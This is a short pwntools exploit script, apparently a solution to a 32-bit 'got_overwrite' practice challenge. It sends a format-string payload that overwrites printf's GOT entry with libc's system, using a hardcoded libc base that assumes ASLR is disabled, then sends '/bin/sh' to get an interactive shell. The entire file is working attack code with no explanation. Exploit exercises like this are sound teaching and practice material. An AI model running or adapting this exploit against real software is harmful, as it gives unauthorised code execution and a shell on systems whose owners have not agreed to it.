from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
io = process()

libc = elf.libc
libc.address = 0xf7d64000 # ASLR disabled

# use fmrstr_payload function from pwntools (offset, value to overwrite, value to write)
payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
io.sendline(payload)

io.clean()
io.sendline('/bin/sh')
io.interactive()